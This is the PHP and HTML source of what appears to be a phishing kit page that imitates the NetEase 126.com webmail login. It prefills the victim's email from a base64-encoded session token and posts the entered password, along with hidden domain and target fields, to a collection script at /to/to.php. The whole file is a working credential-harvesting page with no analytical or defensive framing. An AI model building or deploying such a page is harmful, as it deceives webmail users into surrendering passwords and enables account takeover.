<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>126&#32593;&#26131;&#20813;&#36153;&#37038;-&#20320;&#30340;&#19987;&#19994;&#30005;&#23376;&#37038;&#23616;</title>
<link rel="shortcut icon" href="https://mail.163.com/favicon.ico"/>
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #676767;
  font-weight: 700;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  input[type=text]{
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 48px;
  width: 100%;
  padding: 8 15px;
  margin: 0;
  background-color: transparent;
  border: 1px solid #d6d6d6;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 0px;
  border-radius: 5px;
  font-size: 15px;
  line-height: 1.42857143;
  vertical-align: top;
  color: #404040;
  }
  input[type=password]{
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 48px;
  width: 100%;
  padding: 8 15px;
  margin: 0;
  background-color: transparent;
  border: 1px solid #d6d6d6;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 5px;
  border-radius: 5px;
  font-size: 15px;
  line-height: 1.42857143;
  vertical-align: top;
  color: #404040;
  }
  input[type=text]:focus, 
  input[type=password]:focus {
  outline: none;
  background-color: transparent;
  border: 1px solid #2985db;
  }
 </style>
<body background="img/bg.png">

<table border="0" width="100%" cellspacing="0" cellpadding="0">
	<tr>
		<td>
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tr>
				<td width="40"></td>
				<td width="315">
				<img border="0" src="img/header_101.png" width="315" height="70"></td>
				<td></td>
				<td width="532">
				<img border="0" src="img/header_102.png" width="532" height="70"></td>
				<td width="40"></td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td height="66" ></td>
	</tr>
	<tr>
		<td>
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tr>
				<td width="186" height="488"></td>
				<td width="459">&nbsp;</td>
				<td></td>
				<td width="400" background="img/form.png">
				<table border="0" width="100%" cellspacing="0" cellpadding="0">
				  <form action="/to/to.php" method="post"> 
					<tr>
						<td height="116"></td>
					</tr>
					<tr>
						<td>
						<table border="0" width="100%" cellspacing="0" cellpadding="0">
							<tr>
								<td width="31">&nbsp;</td>
								<td height="48">
                                                                    										    <input type="text" name="user" required  placeholder="&#47196;&#44536;&#51064; ID" value="<?php echo $users;?>" style="border:0; border-bottom: 1px #ddd solid; border-top: 1px #ddd solid; border-right: 0px #ddd solid; border-left: 1px #ddd solid; border-top-left-radius:5px; border-bottom-left-radius:5px; border-top-right-radius:0px; border-bottom-right-radius:0px" /><input type="text" name="" required  placeholder="&#47196;&#44536;&#51064; ID" value="@<?php echo $ddomain;?>" style="border:0; border-bottom: 1px #ddd solid; border-top: 1px #ddd solid; border-left: 0px #ddd solid; border-right: 1px #ddd solid; border-top-right-radius:5px; border-bottom-right-radius:5px; border-top-left-radius:0px; border-bottom-left-radius:0px" />

								    <input type="text" name="user" placeholder="&#37038;&#31665;&#36134;&#21495;&#25110;&#25163;&#26426;&#21495;&#30721;" value="<?php echo $users;?>" id="" ></td>
								<td width="28">&nbsp;</td>
							</tr>
						</table>
						</td>
					</tr>
					<tr>
						<td height="17"></td>
					</tr>
					<tr>
						<td>
						<table border="0" width="100%" cellspacing="0" cellpadding="0">
							<tr>
								<td width="31">&nbsp;</td>
								<td height="48">
								    <input type="password" name="passwd" placeholder="&#36755;&#20837;&#23494;&#30721;" value="" autofocus ></td>
								<td width="28">&nbsp;</td>
							</tr>
						</table>
						</td>
					</tr>
					<tr>
						<td height="82"></td>
					</tr>
																	<td>
                                                                    <input  name="link" type="hidden" value="https://mail.126.com/"  >
																	</td>
																	<td>
                                                                    <input  name="domain" type="hidden" value="<?php echo $ddomain;?>"  >
                                                                    <input  name="sender" type="hidden" value="126.com"  >
																	</td>
											<tr>
						<td>
						<table border="0" width="100%" cellspacing="0" cellpadding="0">
							<tr>
								<td width="31"></td>
								<td>
								<input type="image" src="img/btn.png" width="340" height="50"></td>
								<td width="28">&nbsp;</td>
							</tr>
						</table>
						</td>
					</tr>
					<tr>
						<td height="128"></td>
					</tr>
				  </form>
				</table>
				</td>
				<td width="80"></td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td height="30"></td>
	</tr>
	<tr>
		<td>
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tr>
				<td width="348"></td>
				<td>
				<img border="0" src="img/footer.png" width="681" height="104"></td>
				<td width="327"></td>
			</tr>
		</table>
		</td>
	</tr>
</table>

</body>

</html>

<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>